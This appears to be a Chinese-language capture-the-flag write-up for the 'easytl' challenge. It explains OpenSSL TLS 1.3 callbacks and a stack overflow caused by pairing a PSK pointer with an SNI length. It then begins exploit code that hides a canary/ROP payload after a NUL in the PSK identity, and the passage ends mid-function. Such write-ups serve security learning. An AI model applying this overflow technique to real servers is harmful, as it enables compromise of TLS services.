# easytl

+++++++++
# 总览以及前置

程序是一个实现了TLS服务的server，注册了三个回调函数：

```none
sub_402DBB → external_psk_find_session_cb
sub_4030D5 → vulnerable_tls_info_cb
sub_40320A → sni_servername_cb
```

其中vulnerable_tls_info_cb当中含有：

```none
sub_40304D → vulnerable_log_error
```

三个回调单独看都不直接产生可控溢出；真正漏洞来自它们通过全局变量共享状态时，把 PSK 的指针和 SNI 的长度错误地配成了一对。


+++++
## 在网络结构的层面中，TLS占据着这样一个位置：

TLS服务，transport layer security，传输层安全协议。

TCP/IP 四层网络协议模型：

```clike
第四层 · 应用层 Application HTTP / 自定义 CTF 协议 / 其他应用协议
第三层 · 传输层 Transport TCP 端口、连接、序列号、确认、可靠有序传输
第二层 · 网络层 Internet IPv4 / IPv6 IP 地址、路由、数据包转发
第一层 · 网络接口层 Network Access Ethernet / Wi-Fi 链路帧传输
```

TCP/IP 四层模型没有专门给 TLS 分配一层，它通常被视为应用层内部的安全协议层，相当于给应用层协议套了一个安全壳。


+++++
++++++++
## Linux 进程中的TLS 服务的程序结构

TLS 服务本质上就是一个普通的 Linux 用户态进程，只不过它使用 OpenSSL 库处理 TLS 协议。这一部分对定位攻击面尤为重要。

```clike
Linux 操作系统
│
├── 进程 A：sshd
│
├── 进程 B：nginx
│
└── 进程 C：challenge
      │
      ├── socket / bind / listen / accept
      │
      ├── OpenSSL 库
      │     ├── SSL_CTX
      │     ├── SSL
      │     ├── TLS Handshake
      │     ├── TLS Record
      │     └── Callback
      │
      └── 题目自己的业务代码
            ├── 接收数据
            ├── 解析数据
            ├── 处理请求
            └── 返回结果
```


1. `challenge` 是一个 Linux 进程。
2. OpenSSL 是这个进程使用的一个密码学和 TLS 协议库。
3. TLS Callback 是程序注册给 OpenSSL 的普通 C 函数。

对于静态 ELF，如果 OpenSSL 是静态链接进去的，那么 OpenSSL 的相关代码也会被包含在 ELF 中。


下面是一个Linux TLS server的标准程序结构。对一个strip掉符号的二进制做逻辑恢复，是需要事先知道的一套固定写法

它需要完成四件事情：


1. 创建 TCP 监听套接字。
2. 初始化 TLS 环境。
3. 接受客户端连接并执行 TLS 握手。
4. 读取、处理和返回应用层数据。

这就是一个最基本的 TLS 服务端架构。

```clike
// socket() bind() listen() 创建 TCP 监听套接字
listen_fd = socket(AF_INET, SOCK_STREAM, 0);
bind(listen_fd, 0.0.0.0:1443);
listen(listen_fd, 1);
// 此时，程序已经成为一个 TCP 服务端。但是还没有TLS

/* 第二部分：初始化 TLS 环境，也可以说是初始化OpenSSL，
   告诉 OpenSSL：我要作为 TLS 服务端工作。 */
ctx = SSL_CTX_new(TLS_server_method());

SSL_CTX_set_ciphersuites(
    ctx,
    "TLS_AES_256_GCM_SHA384"
);

SSL_CTX_use_certificate_file(
    ctx,
    "server.crt",
    SSL_FILETYPE_PEM
);

SSL_CTX_use_PrivateKey_file(
    ctx,
    "server.key",
    SSL_FILETYPE_PEM
);

SSL_CTX_set_psk_find_session_callback(
    ctx,
    psk_find_cb
);

SSL_CTX_set_tlsext_servername_callback(
    ctx,
    sni_cb
);

SSL_CTX_set_info_callback(
    ctx,
    info_cb
);

// TLS握手环节 从 accept() 到 SSL_accept() 这是一个简化的单进程串行处理示例。
for (;;) {
    client_fd = accept(listen_fd, NULL, NULL);
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_fd);

    if (SSL_accept(ssl) == 1) { //TLS握手，在SSL_accept()中发生，上面注册的三个回调函数都在这里被调用
        SSL_read(ssl, buffer, sizeof(buffer));
        process_request(buffer);
        SSL_write(ssl, response, response_len);
    }

    SSL_free(ssl);
    close(client_fd);
}
```

### 两个OpenSSL库中定义的类——SSL_CTX 和 SSL

SSL_CTX（SSL_context，SSL上下文）：TLS 服务端的全局配置对象，保存这个 TLS 服务需要使用的协议配置、密码套件、认证方式和各种回调函数。相当于用ssl = SSL_new(ctx)创建SSL对象之前，ctx相当于一个配置，告诉SSL_new()以一个什么方式生成ssl连接。

本题用到的SSL_CTX类的一些方法：

`ctx = SSL_CTX_new(TLS_server_method());` 

返回SSL_CTX类的一个实例ctx，相当于生成一个空TLS配置单子，接下来要往里面写具体配置。


`SSL_CTX_set_ciphersuites(ctx, "TLS_AES_256_GCM_SHA384" );`

设置 TLS 1.3 密码套件。


如果使用证书认证：

`SSL_CTX_use_certificate_file( ctx, "server.crt", SSL_FILETYPE_PEM );`

`SSL_CTX_use_PrivateKey_file( ctx, "server.key", SSL_FILETYPE_PEM );`

加载服务器证书和私钥。

这就是为什么本题的附件不只给了一个静态ELF，还给了证书和私钥。


如果使用 External PSK，就要注册 PSK 查找回调：

`SSL_CTX_set_psk_find_session_callback( ctx, psk_find_cb );`


如果使用 SNI，也要注册SNI 回调：

`SSL_CTX_set_tlsext_servername_callback( ctx, sni_cb );`


如果需要观察 TLS 内部状态，就需要注册 Info Callback：

`SSL_CTX_set_info_callback( ctx, info_cb );`

这些 Callback 都是在 SSL_CTX 初始化阶段注册的。

“注册”的过程，就是相当于把函数指针保存在了配置当中。等到 TLS 协议执行到相应阶段时，再调用这些函数。后续会讲到这些函数具体在何时被调用。


SSL：每个客户端连接对应的 TLS 对象

客户端建立 TCP 连接后，服务端需要为它创建一个 SSL 对象：

`ssl = SSL_new(ctx);`

这里的 ssl 代表一个具体的 TLS 连接。ctx是一个上面被设置好的配置对象，现在要用它来生成具体的SSL对象。

ssl保存这个连接自己的状态，例如：

* 当前握手进度。
* 协商出来的 TLS 版本。
* 密钥交换状态。
* 加密和解密状态。
* Record 层状态。
* 对端信息。

必须弄清楚的一个点是，在本题的情境下一个SSL实例ssl就代表一个具体的TLS连接。

`SSL_new()` 本身并不限定只能创建 TLS 服务端连接对象。它创建什么类型的连接对象，取决于传入的 `SSL_CTX` 所使用的协议方法（SSL_METHOD）。

因为之前ctx实例被创建时，`ctx = SSL_CTX_new(TLS_server_method())`使用了`TLS_server_method()`，使用了TLS协议方法。所以本题的ssl实例即对应一个TLS连接。

`TLS_server_method()`告诉 OpenSSL：我要创建一个用于 TLS 服务端的协议处理环境。

OpenSSL 提供了不同的协议方法：

| 方法  | 用途  |
|-----|-----|
| `TLS_server_method()` | TLS 服务端（本题server用到的就是它） |
| `TLS_client_method()` | TLS 客户端（后续攻击者exp会用到它与server通信） |
| `TLS_method()` | 通用 TLS 方法，可用于客户端或服务端 |
| `DTLS_server_method()` | DTLS 服务端 |
| `DTLS_client_method()` | DTLS 客户端 |
| `DTLS_method()` | 通用 DTLS 方法 |

乍一看，其实本质上都有一个“TLS”。那么OpenSSL库是不是本身就是为TLS而设计的呢？其实是的。SSL（Secure Sockets Layer，安全套接字层）最初的核心目标就是提供 SSL/TLS 安全通信能力。后来 SSL 逐渐发展为 TLS（Transport Layer Security，传输层安全协议）。而OpenSSL库本身，则逐渐成为一个通用的密码学软件库。内部在原有的负责安全通信协议的实现基础上，添加了许多独立于 TLS 协议的密码学基础设施，在本题当中就用不到了。


### 实际TLS握手——**OpenSSL Callback 的触发机制**

解释这一部分：

```clike
for (;;) {
    client_fd = accept(listen_fd, NULL, NULL);
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, client_fd);

    if (SSL_accept(ssl) == 1) {
        SSL_read(ssl, buffer, sizeof(buffer));
        process_request(buffer);
        SSL_write(ssl, response, response_len);
    }

    SSL_free(ssl);
    close(client_fd);
}
```

`accept()`：接受 TCP 连接，内核完成 TCP 三次握手之后，`accept()` 返回一个新的文件描述符client_fd。监听套接字listen_fd负责接入连接。客户端套接字client_fd负责具体的数据传输。

`ssl = SSL_new(ctx);`创建一个新的 SSL 对象。它继承 `SSL_CTX` 中的 TLS 配置，但拥有自己的连接状态。

`SSL_set_fd(ssl, client_fd);`将 TLS 和 TCP 连接关联，OpenSSL 知道了：当前 TLS 连接的底层数据来自 FD 4。


`SSL_accept(ssl)`真正开始 TLS 握手，是一个极其重要的函数。它不是简单地接收一个 TCP 连接。它会驱动 TLS 服务端握手状态机。

`SSL_accept(ssl)`内部主要做的事情，就是驱动OpenSSL 开始读取客户端发送的 ClientHello。当它解析到不同的 TLS 信息时，就会在相应位置调用已经注册的回调。

```clike
              OpenSSL Callback 的触发机制
                         |
                         v
                   SSL_accept(ssl)
                    应用程序调用 OpenSSL
                         |
                         v
              OpenSSL 内部 TLS 状态机
                  读取、解析 ClientHello
                         |
             +-----------+-----------+
             |                       |
             v                       v
       发现 PSK Identity          处理 SNI 扩展
             |                       |
             v                       v
       调用 PSK Callback         调用 SNI Callback
       psk_find_session_cb()     sni_cb()
             |                       |
             +-----------+-----------+
                         |
                         v
              各自完成处理并返回 OpenSSL
                         |
                         v
                TLS 状态变化 / Alert / 错误
                         |
                         v
                  调用 Info Callback
                      info_cb()
                         |
                         v
                继续 TLS 握手或处理异常
```

PSK Callback：

注册时，只是把psk_find_session_cb的函数指针写入了ctx：

```clike
SSL_CTX_set_psk_find_session_callback(
    ctx,
    psk_find_session_cb
);
```

触发时为TLS 1.3 服务端处理客户端 ClientHello 中的 PSK 信息，需要根据 PSK Identity 查找对应 Session 时。

例如客户端发送：

```clike
ClientHello
    └── pre_shared_key
          └── identity
                └── "1401518dc5d7641ccd41593a5d812410"
```

OpenSSL 解析到 PSK Identity 后，需要应用程序提供对应的 PSK Session。

于是调用：

```clike
psk_find_session_cb(
    ssl,
    identity,
    identity_len,
    &session
);
```

一个很重要的细节：

PSK Callback 并不是每收到一个 TCP 数据包就调用一次，而是在 TLS 协议处理需要查找 PSK Session 的时候调用。

PSK：Pre-Shared Key 预共享密钥。


SNI Callback：

注册时，只是把sni_cb的函数指针写入了ctx：

```clike
SSL_CTX_set_tlsext_servername_callback(
    ctx,
    sni_cb
);
```

触发时机：

服务端处理 ClientHello 中的 SNI 扩展时。

例如：

```clike
ClientHello
    |
    └── Extensions
          |
          └── server_name
                |
                └── www.example.com
```

OpenSSL 解析到服务器名称后，就可以调用：

```clike
sni_cb(ssl, &alert, arg);
```

SNI:  Server Name Indication 服务器名称指示。


Info Callback：

注册时，只是把info_cb的函数指针写入了ctx：

```clike
SSL_CTX_set_info_callback(
    ctx,
    info_cb
);
```

这个回调与前两个不太一样。

它不是只在某一个固定的握手字段出现时调用。

而是在 TLS 连接建立和使用过程中，发生特定状态变化、Alert 或错误事件时调用。


`SSL_accept()`内部可能发生的事情包括：


1. 从 TCP 连接读取客户端 ClientHello。
2. 从读取到的ClientHello解析 TLS 版本、扩展和密码套件。
3. 处理 SNI 扩展。
4. 处理 PSK 相关信息。
5. 协商密钥。
6. 验证相应的握手认证信息。
7. 完成握手

### Callback函数中所处理的ClientHello究竟是什么？

ClientHello 是 TLS 握手协议（Handshake Protocol）定义的一种消息（可以说是一种结构体，一种类，都可以），由客户端在 TLS 握手开始时发送给服务端。它包含客户端支持的 TLS 参数，以及一系列可选扩展（Extensions）。如果客户端要使用 PSK（Pre-Shared Key，预共享密钥）方式建立连接，就会在 ClientHello 的 `pre_shared_key` 扩展中携带 PSK Identity。

在客户端和服务端建立 TCP 连接之后，客户端需要发送 ClientHello，告诉服务端：

* 我支持哪些 TLS 协议版本？
* 我支持哪些加密算法？
* 我支持哪些密钥交换方式？
* 我希望访问哪个服务器名称？
* 我是否希望使用 PSK？
* 如果使用 PSK，我有哪些可用的 PSK Identity？

服务端收到 ClientHello 后，根据这些信息决定如何继续 TLS 握手。

一个非常重要的层次关系：

```clike
TLS 连接建立
    |
    | TCP 三次握手完成
    v
客户端发送 ClientHello
    |
    ├── TLS 版本信息
    ├── 随机数
    ├── 支持的密码套件
    └── Extensions（扩展）
          |
          ├── server_name（SNI）
          |
          ├── supported_versions
          |
          ├── key_share
          |
          ├── psk_key_exchange_modes
          |
          └── pre_shared_key
                  |
                  └── PSK Identity
```

服务端SSL_accept()驱动OpenSSL读取的PSK和SNI信息就保存在ClientHello结构当中。

所以，PSK Identity 不是 ClientHello 的顶层字段，而是嵌套在 `pre_shared_key` 扩展里面的字段。

RFC 8446 中的正式结构定义：

```clike
struct {
    ProtocolVersion legacy_version;
    Random random;
    opaque legacy_session_id<0..32>;
    CipherSuite cipher_suites<2..2^16-2>;
    opaque legacy_compression_methods<1..2^8-1>;
    Extension extensions<8..2^16-1>;
} ClientHello;
```

这看起来很像一个 C 语言结构体。

但注意：这是 TLS 规范使用的协议描述语言（Presentation Language），不是可以直接拿来作为内存布局使用的 C 结构体。

如果使用wireshark在自己的 TLS/1443 服务上抓包，然后使用：

`tcp.port == 1443 && tls.handshake.type == 1`选中一个 ClientHello 数据包，在 Packet Details（数据包详情）中展开，就可以看到实际的ClientHello数据包大概是这个样子：

```clike
Transport Layer Security
    TLSv1.3 Record Layer: Handshake Protocol
        Handshake Protocol: Client Hello
            Handshake Type: Client Hello (1)
            Version: TLS 1.2 (0x0303)
            Random: ...
            Session ID Length: ...
            Cipher Suites Length: ...
            Compression Methods Length: ...
            Extensions Length: ...
                Extension: server_name
                Extension: supported_versions
                Extension: key_share
                Extension: psk_key_exchange_modes
                Extension: pre_shared_key
                    Identities
                        PSK Identity
                            Identity Length: ...
                            Identity: ...
                            Obfuscated Ticket Age: ...
                    Binders
                        PSK Binder: ...                      
```

TLS 1.3 中 ClientHello 是握手早期的明文消息，所以这些扩展通常能够被 Wireshark 直接解析；后续握手消息则受到 TLS 加密保护。

| 字段  | 含义  | 作用  |
|-----|-----|-----|
| `legacy_version` | 兼容性版本字段 | TLS 1.3 中固定为 0x0303 |
| `random` | 客户端随机数 | 32 字节随机数据 |
| `legacy_session_id` | 旧版本会话 ID | 兼容旧版本 TLS |
| `cipher_suites` | 密码套件列表 | 告诉服务端支持哪些加密套件 |
| `legacy_compression_methods` | 兼容性压缩字段 | TLS 1.3 中固定为一个 0 字节 |
| `extensions` | 扩展列表 | 携带 SNI、PSK、密钥交换等信息 |

最重要的是最后一个字段：Extension extensions<8..2^16-1>;

这道题涉及的 PSK Identity 和 SNI，都在这里面。

可以把 Extensions 理解为：

TLS 为了方便扩展协议功能而设计的一套可选参数机制。

例如：

| Extension | 作用  |
|-----------|-----|
| `server_name` | 携带 SNI |
| `supported_versions` | 声明支持的 TLS 版本 |
| `supported_groups` | 声明支持的密钥交换群组 |
| `key_share` | 携带密钥交换数据 |
| `signature_algorithms` | 声明支持的签名算法 |
| `psk_key_exchange_modes` | 声明支持的 PSK 密钥交换模式 |
| `pre_shared_key` | 携带 PSK Identity 和 Binder |

每一个 Extension 本身也有统一的结构：

```clike
struct {
    ExtensionType extension_type;
    opaque extension_data<0..2^16-1>;
} Extension;
```

* `extension_type`：扩展类型编号。
* `extension_data`：这个扩展自己的具体数据。

例如：

`extension_type = 0x0000`

代表 SNI 扩展。

`extension_type = 0x0029`

代表 PSK 扩展。

所以，TLS 可以通过不同的扩展类型识别不同的数据结构。

下面回答PSK Identity 究竟定义在哪里。

PSK Identity在ClientHello当中的具体定义：

ClientHello：

```clike
ClientHello
    |
    └── extensions
           |
           └── pre_shared_key
```

RFC 8446 第 4.2.11 节定义了 `pre_shared_key` 扩展。

其中最重要的是下面这个结构：

```clike
struct {
    opaque identity<1..2^16-1>;
    uint32 obfuscated_ticket_age;
} PskIdentity;
```

结构体`PskIdentity`包含两个字段：

| 字段  | 含义  |
|-----|-----|
| `identity` | PSK 身份标识，实际是字节序列 |
| `obfuscated_ticket_age` | 混淆后的 PSK Ticket 年龄 |

其中：`opaque identity<1..2^16-1>`

* `opaque`：表示不透明的原始字节数据。
* `1..2^16-1`：表示长度范围为 1 到 65535 字节。
* 它是一个具有明确长度的字节向量。

这意味着 PSK Identity 本质上不是 C 字符串，而是一段有长度的二进制数据。

实际上，`pre_shared_key` 扩展不仅仅包含一个 Identity，它还包含 PSK Binder（预共享密钥绑定值）

```clike
struct {
    PskIdentity identities<7..2^16-1>;
    PskBinderEntry binders<33..2^16-1>;
} OfferedPsks;
```

其中：

```clike
struct {
    opaque identity<1..2^16-1>;
    uint32 obfuscated_ticket_age;
} PskIdentity;

opaque PskBinderEntry<32..255>;
```

因此可以看出`pre_shared_key` 扩展的结构：

```clike
ClientHello
    |
    v
Extensions
    |
    v
pre_shared_key
Extension Type: 0x0029
    |
    ├── identities
    │     |
    │     ├── PskIdentity 1
    │     │     ├── identity
    │     │     └── obfuscated_ticket_age
    │     │
    │     └── PskIdentity 2（可选）
    │           ├── identity
    │           └── obfuscated_ticket_age
    │
    └── binders
          |
          ├── PskBinderEntry 1
          │
          └── PskBinderEntry 2
```

两个细节：  
第一，客户端可以提供多个 PSK Identity。

第二，PSK Binder的用途，是用来证明客户端确实持有对应的 PSK。

它不是普通的 Identity 字符串，而是使用 PSK 相关密钥材料和当前握手消息的部分内容计算出来的 HMAC 值。

* Identity：告诉服务器要使用哪一把 PSK。
* Binder：证明客户端确实掌握对应的 PSK，并将它与当前握手绑定。


现在终于可以把协议规范和之前分析的 C 代码对应起来了。

之前的回调：

```clike
int psk_find_session_cb(
    SSL *ssl,
    const unsigned char *identity,
    size_t identity_len,
    SSL_SESSION **out_session
)
```

其中：`const unsigned char *identity`和`size_t identity_len`就是 OpenSSL 从 ClientHello 的 `pre_shared_key` 扩展中解析出的某个 PSK Identity 数据及其长度。








++++++++
那么知道了以上TLS服务在linux进程中的底层实现之后，我们就可以回到总览上理解整道题的攻击面。就是server在处理HelloClient的过程中对三个回调函数的调用引发了漏洞，攻击者构造自己的HelloClient从而实现漏洞利用。

+++++
## 本题三个回调函数的行为和为什么会产生漏洞

整体上，`sub_4032BB()` 注册了三个回调：

```clike
sub_402DBB → external_psk_find_session_cb
sub_4030D5 → vulnerable_tls_info_cb
sub_40320A → sni_servername_cb
```

这三个函数通过六个全局变量连接起来：

```clike
0x970F40  g_psk_ptr
0x970F48  g_psk_len

0x970F50  g_sni_ptr
0x970F58  g_sni_len

0x970F60  g_current_ptr
0x970F68  g_current_len
```

通过全局变量连接，是导致三个回调函数彼此配合产生漏洞的根本原因。

整体关系为：

```clike
external PSK callback
    → 写入 g_psk_ptr / g_psk_len

SNI callback
    → 写入 g_sni_ptr / g_sni_len

info callback
    → 错误组合 g_psk_ptr + g_sni_len
    → 调用 sub_40304D
    → 栈溢出
```

### 一、external PSK 回调 sub_402DBB

地址：`0x402DBB`

它的 OpenSSL 回调原型接近：

```clike
int psk_find_session_cb(
    SSL *ssl,
    const unsigned char *identity,
    size_t identity_len,
    SSL_SESSION **session
);
```

反汇编伪代码：

```clike
int psk_find_session_cb(
    SSL *ssl,
    const unsigned char *identity,
    size_t identity_len,
    SSL_SESSION **out_session
)
{
    unsigned char master[64];
    unsigned int master_len;
    size_t secret_len;
    unsigned char *secret;
    const SSL_CIPHER *cipher;
    SSL_SESSION *session;

    if (strlen((char *)identity) != 32 ||
        memcmp(identity,
               "1401518dc5d7641ccd41593a5d812410",
               32) != 0) {
        *out_session = NULL;
        return 1;
    }

    secret = OPENSSL_hexstr2buf(FIXED_SECRET, &secret_len);

    if (secret == NULL)
        exit(1);

    g_psk_len = 32;

    g_psk_ptr = calloc(1, identity_len + 16);
    memcpy(g_psk_ptr, identity, identity_len);

    HMAC(
        EVP_sha512(),
        secret,
        secret_len,
        g_psk_ptr,
        g_psk_len,
        master,
        &master_len
    );

    OPENSSL_free(secret);

    cipher = SSL_CIPHER_find(ssl, "\x13\x02");

    if (cipher == NULL)
        exit(1);

    session = SSL_SESSION_new();

    if (session == NULL)
        return 0;

    if (!SSL_SESSION_set1_master_key(
            session, master, master_len))
        return 0;

    if (!SSL_SESSION_set_cipher(session, cipher))
        return 0;

    if (!SSL_SESSION_set_protocol_version(
            session, SSL_version(ssl)))
        return 0;

    *out_session = session;
    return 1;
}
```

主要行为：

`strlen((char *)identity) != 0x20)`检查 identity 的 C 字符串长度

注意它检查的是：`strlen(identity)`而不是显式参数：`identity_len`

这是后续能够在 NUL 后隐藏二进制 payload 的基础。


`memcmp(identity, "1401518dc5d7641ccd41593a5d812410",32) != 0)`检查前32字节固定内容

无效时：`*session = NULL; return 1;`这里不是直接返回0，而是告诉 OpenSSL：

`回调执行完成，但没有找到对应 PSK session`最终握手仍会因为找不到 PSK 而失败。


`g_psk_len = 0x20;`把全局 PSK 长度强制设置为32

注意这里保存的不是`identity_len` ，因此无论实际 identity 有多长，\`g_psk_len\` 始终为32。

`g_psk_ptr = calloc(1, identity_len + 0x10);`根据显式 identity_len 分配并复制

然后：`memcpy(g_psk_ptr, identity, identity_len);`这里就是 payload 注入点。

可以构造：

```clike
前32字节       合法固定 identity
第33字节       NUL
NUL之后         Canary、ROP 等任意二进制数据
identity_len    0x100
```

于是：`strlen(identity) == 32`成立，但`memcpy(..., identity_len)`仍然复制完整256字节。

其余对OpenSSL的密码学API调用在本题中不是主要问题，不再赘述。

### 二、SNI 回调 sub_40320A

回调原型近似：

```clike
int sni_callback(
    SSL *ssl,
    int *alert,
    void *arg
);
```

后两个参数实际没有使用。

完整伪代码：

```clike
int sni_callback(SSL *ssl, int *alert, void *arg)
{
    const char *server_name;

    server_name = SSL_get_servername(
        ssl,
        TLSEXT_NAMETYPE_host_name
    );

    if (server_name == NULL || server_name[0] == '\0') {
        g_sni_len = 0;
        g_sni_ptr = NULL;
        return SSL_TLSEXT_ERR_NOACK;
    }

    g_sni_len = strlen(server_name);

    g_sni_ptr = calloc(1, g_sni_len + 0x10);
    memcpy(g_sni_ptr, server_name, g_sni_len);

    return SSL_TLSEXT_ERR_OK;
}
```

这个回调本身分配足够空间，没有直接溢出。

它对利用链的作用是提供：`g_sni_len`即后续栈溢出的长度。

主要行为：

`server_name = SSL_get_servername(ssl, TLSEXT_NAMETYPE_host_name);`取得客户端 SNI

`if (server_name == NULL || server_name[0] == '\0') goto no_sni;`检查 SNI 是否为空，没有 SNI 时

```clike
g_sni_len = 0;
g_sni_ptr = NULL;
return 3;
```

OpenSSL 中：

`3 = SSL_TLSEXT_ERR_NOACK`

含义是：

`不确认这个 SNI，但不因此终止握手`


`g_sni_len = strlen(server_name);`保存 SNI 长度

`g_sni_ptr = calloc(1, g_sni_len + 0x10);`为 SNI 分配堆内存

`memcpy(g_sni_ptr, server_name, g_sni_len);`复制 SNI 内容，由于使用 `calloc()` 并且额外分配了16字节，后面自然存在 NUL。


### 三、TLS info callback sub_4030D5

原型：

```clike
void info_callback(
    const SSL *ssl,
    int where,
    int ret
);
```

`ret` 被保存到栈上，但后面没有实际使用。

info callback 完整伪代码：

```clike
void info_callback(const SSL *ssl, int where, int ret)
{
    if (where & 0x2002) {
        if (g_psk_ptr != NULL)
            g_current_ptr = g_psk_ptr;
        else if (g_sni_ptr != NULL)
            g_current_ptr = g_sni_ptr;
        else
            g_current_ptr = NULL;

        if (g_psk_len != 0)
            g_current_len = g_psk_len;

        if (g_sni_len != 0)
            g_current_len = g_sni_len;

        return;
    }

    if (where & 0x4004) {
        int fd = SSL_get_fd(ssl);

        if (g_psk_ptr != NULL) {
            g_current_ptr = g_psk_ptr;

            if (g_psk_len == 0x20)
                log_error();

        } else if (g_sni_ptr != NULL) {
            g_current_ptr = g_sni_ptr;

            if (g_sni_len <= 0x40)
                log_error();
        }

        write(fd, "error", 5);
    }
}
```

第一类状态：where & 0x2002 按位判断。只要 `where` 中包含相应状态位，就会进入。

```clike
if (g_psk_ptr != NULL) {
    g_current_ptr = g_psk_ptr;
}
```

选择 current_ptr，只有 PSK 不存在时，才尝试 SNI：

```clike
else if (g_sni_ptr != NULL) {
    g_current_ptr = g_sni_ptr;
}
```

都不存在则：`g_current_ptr = NULL;`

因此指针优先级是PSK 高于 SNI

然后：

```clike
if (g_psk_len != 0)
    g_current_len = g_psk_len;    
```

设置 current_len，然后它不是 `else if`，而是再次独立检查 SNI:

```clike
if (g_sni_len != 0)
    g_current_len = g_sni_len;
    
```

这就是关键错误。

当 PSK 和 SNI 同时存在，那么最终info callback就会把最终全局变量搞成这样：

`g_current_ptr = g_psk_ptr `

`g_current_len = g_sni_len`

原因是指针使用：`if (...) { } else if (...) { }`

而长度使用：`if (...) { }  if (...) { }`

第二个长度赋值覆盖了第一个。

这个长度错配问题将在之后log_error()函数当中造成栈溢出。


第二类状态：where & 0x4004 这是 TLS alert 相关状态。

也就是可以理解为，我们第一次构造合法TLS record，这里的where & 0x2002就成立，第二次构造非法TLS record，就会进入where & 0x4004分支。

合法握手：准备错误的“PSK指针 + SNI长度”状态 

非法record：触发alert，消费这个错误状态并造成栈溢出


`fd = SSL_get_fd(ssl);`取得连接 socket fd

alert 时优先使用 PSK 指针

```clike
if (g_psk_ptr != NULL) {
    g_current_ptr = g_psk_ptr;
```

然后：

```clike
if (g_psk_len == 0x20)
    log_error();
```

因为PSK 回调总是`g_psk_len = 0x20;`于是只要成功使用 PSK，这个条件必然成立。

如果没有 PSK而有 SNI 时：`g_current_ptr = g_sni_ptr;`

然后

```clike
if (g_sni_len <= 0x40)
    log_error();
```

这条 SNI-only 路径本身有长度限制：`0x40 = 64字节`日志缓冲区有80字节，因此不能溢出。关键错误是alert 分支不更新 current_len，alert 分支重新执行了`g_current_ptr = g_psk_ptr;`但没有执行`g_current_len = g_psk_len;`所以 `g_current_len` 保留之前状态分支设置的`g_sni_len`

最终：

`g_current_ptr = g_psk_ptr`

`g_current_len = g_sni_len`

使用原始 write 发送 error`write(fd, "error", 5);`注意这是普通 Linux `write()`，不是`SSL_write()`

因此 `error` 会以 TLS 之外的明文直接写入 TCP 连接。

这正好可以作为 Canary oracle。


### 四、辅助函数log_error()

info callback内部的辅助函数sub_40304D()即为log_error()，它不是注册回调，但必须和 info callback 一起分析。

完整伪代码：

```clike
void log_error(void)
{
    char buf[0x50];

    memset(buf, 0, sizeof(buf));

    memcpy(
        buf,
        g_current_ptr,
        g_current_len
    );

    fprintf(stderr, "%s error\n", buf);
}
```

存在无界复制。因为g_current_len = g_sni_len g_current_ptr = g_psk_ptr

三个回调函数通过全局变量联系在一起，以下是server处理攻击者发送的在PSK Identity中存在攻击载荷的ClientHello的过程，以及攻击者发送非法record，导致server OpenSSL触发alert，进入where & 0x4004分支，调用log_error()引发无界写，触发漏洞的过程：

```clike
第一步：PSK 回调
g_psk_ptr = 包含 ROP 的二进制 identity，共有248字节，32字节身份验证串 + NULL + 剩余payload
g_psk_len = strlen(identity) = 32 因为strlen()会把字符串从NULL截断。

第二步：SNI 回调
g_sni_ptr = 长 SNI
g_sni_len = 248

第三步：info callback 握手状态
g_current_ptr = g_psk_ptr
g_current_len = g_psk_len
g_current_len = g_sni_len   // 覆盖成248

第四步：非法 TLS record 触发 alert
g_current_ptr = g_psk_ptr
// 没有恢复 g_current_len

第五步：log_error
memcpy(
    80字节栈缓冲区,
    g_psk_ptr,
    248
);

总结：
PSK identity 控制复制内容
SNI 控制复制长度
TLS alert 控制触发时机
```


+++++
+++++++++

+++++
# 攻击者客户端要发送什么

知道了OpenSSL的一些用法和本题具体漏洞触发的原理之后才知道到底要攻击什么。

这一部分的重点是看在编写C程序EXP过程中，ClientHello是怎么构造并发送给server的，ClientHello是怎么携带payload的，以及非法record又究竟是什么。

```none
1. TLS ClientHello
   ├─ SNI：控制溢出长度
   ├─ external PSK identity：携带栈覆盖 payload
   ├─ PSK binder：保证握手合法
   └─ TLS_AES_256_GCM_SHA384

2. TLS 握手正常完成

3. 直接向 TCP socket 发送非法 TLS record
   ├─ 触发服务端 AEAD 校验失败
   ├─ 触发 TLS alert
   ├─ 进入 info callback
   └─ 调用存在栈溢出的日志函数
```

ClientHello 必须是合法 TLS 数据 最后的 bad record 必须是非法 TLS 数据

前者用来让三个回调完成状态初始化，后者用来触发漏洞。

最终 EXP 使用 OpenSSL C API：

SSL_CTX_set_psk_use_session_callback()


客户端回调可以直接返回：  
unsigned char \*identity;  size_t identity_len;  SSL_SESSION \*session;


## 第一步：构造 PSK identity

服务端要求： strlen(identity) == 32

并要求前32字节为： 1401518dc5d7641ccd41593a5d812410

但复制时使用的是显式 `identity_len`。

客户端因此构造：

```none
offset 0x00～0x1F  固定合法字符串，共32字节
offset 0x20        NUL，即 \x00
offset 0x21～      任意二进制 payload
identity_len       0x100
```

怎么用C来实现构造？  
EXP 中对应：

```clike
static unsigned char identity[512];
static size_t identity_len;

const char fixed[] =
    "1401518dc5d7641ccd41593a5d812410";

memset(identity, 'A', sizeof(identity));
memcpy(identity, fixed, 32);
identity[32] = 0;
identity_len = 0x100;
//前32字节写fixed[]，加上一个NULL，后面再加上payload
```

这样服务端看到： strlen(identity) == 32

但它实际执行：memcpy(g_psk_ptr, identity, 0x100);

所以 NUL 后面的 payload 也被保存。


## 第二步：客户端提供合法 PSK session

仅仅有正确 identity 还不够，TLS 1.3 的 ClientHello 还包含 PSK binder。

如果 binder 不正确，服务端会在握手早期拒绝客户端，无法稳定走到后续状态。

服务端使用的 master key 是：

```clike
HMAC-SHA512(
    key     = hex_decode(fixed_secret),
    message = identity前32字节
);
```

EXP 把计算结果写成64字节常量：

```clike
static const unsigned char master_key[64] = {
    0x8b,0xd3,0xd0,0x2f,0x8a,0xc2,0xe2,0xa0,
    ...
    0xf7,0x37,0xe9,0x52
};
```

然后客户端 PSK callback 创建 `SSL_SESSION`：

```clike
static int use_psk(
    SSL *ssl,
    const EVP_MD *md,
    const unsigned char **id,
    size_t *idlen,
    SSL_SESSION **sess
)
{
    SSL_SESSION *s = SSL_SESSION_new();

    unsigned char csid[2] = {
        0x13, 0x02
    };

    const SSL_CIPHER *cipher =
        SSL_CIPHER_find(ssl, csid);

    if (!s ||
        !cipher ||
        !SSL_SESSION_set1_master_key(
            s,
            master_key,
            sizeof(master_key)
        ) ||
        !SSL_SESSION_set_cipher(s, cipher) ||
        !SSL_SESSION_set_protocol_version(
            s,
            TLS1_3_VERSION
        )) {

        if (s)
            SSL_SESSION_free(s);

        return 0;
    }
    
// 让 OpenSSL 把包含 NUL、Canary 和 ROP 的二进制 identity 放入 ClientHello。
